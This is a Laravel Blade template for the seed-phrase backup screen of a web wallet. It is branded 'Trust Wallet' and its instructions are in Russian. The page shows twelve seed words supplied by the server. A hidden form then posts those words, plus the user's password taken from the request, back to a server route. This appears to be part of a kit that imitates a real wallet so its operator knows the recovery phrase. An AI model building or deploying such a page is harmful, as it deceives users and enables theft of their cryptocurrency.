<!-- resources/views/auth/seed-phrase.blade.php -->
@extends('layouts.app')

@section('content')
<div class="min-h-screen flex flex-col justify-center items-center bg-gray-900">
    <div class="w-full max-w-md mx-auto">
        <div class="text-center mb-8">
            <img src="{{ asset('images/logo.svg') }}" alt="Trust Wallet" class="h-16 mx-auto mb-4">
        </div>
        
        <div class="bg-gray-800 rounded-lg shadow-lg p-6">
            <div class="flex justify-between mb-4">
                <div class="h-1 w-1/3 bg-green-500 rounded"></div>
                <div class="h-1 w-1/3 bg-green-500 rounded ml-2"></div>
            </div>
            
            <h1 class="text-2xl font-semibold text-white text-center mb-4">Создайте резервную копию вашей Secret Phrase</h1>
            
            <div class="bg-gray-700 rounded-md p-4 mb-6">
                <div class="flex items-center mb-2">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-blue-400 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z" />
                    </svg>
                    <p class="text-sm text-gray-300">
                        Запишите секретную фразу из 12 слов на листке бумаги. Никогда и никому не отправляйте и не показывайте эти данные.
                    </p>
                </div>
            </div>
            
            <div id="blurred-phrase" class="bg-gray-700 rounded-md p-4 mb-6 filter blur-sm">
                <div class="grid grid-cols-3 gap-2">
                    @foreach ($seedPhraseWords as $index => $word)
                        <div class="bg-gray-600 rounded p-2 text-center">
                            <span class="text-gray-400 text-xs">{{ $index + 1 }}.</span>
                            <span class="text-gray-200">{{ $word }}</span>
                        </div>
                    @endforeach
                </div>
            </div>
            
            <div id="revealed-phrase" class="bg-gray-700 rounded-md p-4 mb-6 hidden">
                <div class="grid grid-cols-3 gap-2">
                    @foreach ($seedPhraseWords as $index => $word)
                        <div class="bg-gray-600 rounded p-2 text-center">
                            <span class="text-gray-400 text-xs">{{ $index + 1 }}.</span>
                            <span class="text-gray-200">{{ $word }}</span>
                        </div>
                    @endforeach
                </div>
            </div>
            
            <form action="{{ route('create.wallet.post') }}" method="POST" id="seed-phrase-form" class="hidden">
                @csrf
                <input type="hidden" name="password" value="{{ request('password') }}">
                <input type="hidden" name="password_confirmation" value="{{ request('password_confirmation') }}">
                @foreach ($seedPhraseWords as $index => $word)
                    <input type="hidden" name="seed_words[]" value="{{ $word }}">
                @endforeach
            </form>
            
            <div class="flex justify-between">
                <button id="cancelBtn" onclick="window.history.back()" class="inline-flex items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md text-green-500 hover:text-green-400 focus:outline-none">
                    Отмена
                </button>
                <button id="showBtn" class="inline-flex items-center px-6 py-2 border border-transparent text-sm font-medium rounded-md text-white bg-green-500 hover:bg-green-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500">
                    Показать
                </button>
                <button id="continueBtn" class="hidden inline-flex items-center px-6 py-2 border border-transparent text-sm font-medium rounded-md text-white bg-green-500 hover:bg-green-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500">
                    Продолжить
                </button>
            </div>
        </div>
    </div>
</div>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        const blurredPhrase = document.getElementById('blurred-phrase');
        const revealedPhrase = document.getElementById('revealed-phrase');
        const showBtn = document.getElementById('showBtn');
        const continueBtn = document.getElementById('continueBtn');
        const cancelBtn = document.getElementById('cancelBtn');
        const seedPhraseForm = document.getElementById('seed-phrase-form');
        
        showBtn.addEventListener('click', function() {
            blurredPhrase.classList.add('hidden');
            revealedPhrase.classList.remove('hidden');
            showBtn.classList.add('hidden');
            continueBtn.classList.remove('hidden');
        });
        
        continueBtn.addEventListener('click', function() {
            // Submit the form to create the wallet with the seed phrase
            seedPhraseForm.submit();
        });
    });
</script>
@endsection